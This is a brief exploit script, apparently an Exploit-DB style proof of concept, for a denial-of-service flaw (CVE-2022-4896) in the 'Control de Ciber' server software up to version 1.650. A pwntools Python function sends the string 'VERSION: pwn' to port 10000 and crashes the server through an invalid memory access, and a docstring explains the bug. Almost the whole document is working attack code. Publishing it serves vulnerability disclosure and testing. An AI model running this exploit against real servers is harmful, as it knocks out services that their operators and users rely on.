# Exploit Title: Control de Ciber version - Denial of Service (DoS)
# Date: 19/04/2023
# Exploit Authors: Sergio Apellaniz
# Vendor Homepage: http://www.cbm.com.ar
# Software Link: http://www.cbm.com.ar/downloads.htm
# Version: <= 1.650
# Tested on: Linux
# CVE: CVE-2022-4896
# Github repo: https://github.com/sapellaniz/CVE-2022-4896

from pwn import *
from time import sleep

SERVER_IP = "192.168.56.101"
SERVER_PORT = 10000

def dos_version(ip, port):
    """
    When the server receives the string "VERSION: <file>" it checks the file
    <file> version, expecting <file> to be a component of this software.
    The problem is that the server is comparing <file> with the elements of
    a list, and if it does not match any element, the server tries to access
    a memory region that is not reserved and a memory fault occurs closing
    the program.
    """
    s = remote(ip, port)
    s.send(b"VERSION: pwn\r\n")


if __name__ == "__main__":
    dos_version(SERVER_IP, SERVER_PORT)
